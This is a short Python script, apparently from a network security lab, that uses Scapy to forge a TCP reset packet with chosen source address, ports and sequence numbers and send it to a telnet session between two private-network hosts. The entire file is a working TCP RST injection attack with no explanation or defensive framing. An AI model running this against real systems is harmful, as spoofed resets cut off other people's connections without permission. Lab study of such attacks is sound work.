from scapy.all import *
ip = IP(src="192.168.1.183", dst="192.168.1.223")
tcp = TCP(sport=54180, dport=23, flags=4, seq=2358117597, ack=3993591886)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)